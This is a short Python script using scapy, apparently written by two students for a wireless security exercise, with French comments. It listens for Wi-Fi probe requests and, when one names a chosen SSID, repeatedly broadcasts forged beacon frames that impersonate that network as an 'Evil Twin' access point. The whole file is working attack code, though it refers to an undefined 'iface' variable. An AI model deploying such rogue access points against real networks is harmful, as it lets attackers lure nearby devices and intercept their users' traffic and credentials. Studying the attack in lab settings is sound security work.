# Auteurs : Peguiron Adrien, Viotti Nicolas

from scapy.all import *
from threading import Thread
import pandas
import time
import os

IFACE = "wlan0" # Interface à utiliser
SSID = input("Entrez le SSID recherché\n")

def callback(packet):
    if packet.haslayer(Dot11ProbeReq):
        foundSSID = packet.info.decode() # Récupère le SSID cherché par la probe request
        if (foundSSID == SSID): # Si le SSID de la probe request correspond au SSID entré par l'user, on créé alors un Evil Twin
            dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                          addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
            beacon = Dot11Beacon(cap='ESS+privacy')
            essid = Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
            rsn = Dot11Elt(ID='RSNinfo', info=(
                '\x01\x00'  # RSN Version 1
                '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
                '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
                '\x00\x0f\xac\x04'  # AES Cipher
                '\x00\x0f\xac\x02'  # TKIP Cipher
                '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
                '\x00\x0f\xac\x02'  # Pre-Shared Key
                '\x00\x00'))  # RSN Capabilities (no extra capabilities)

            frame = RadioTap() / dot11 / beacon / essid / rsn

            # Envoi des trames
            sendp(frame, iface=iface, inter=0.100, loop=1)

if __name__ == "__main__":

    # Démarre le sniffing
    sniff(prn=callback, iface=iface, timeout=20)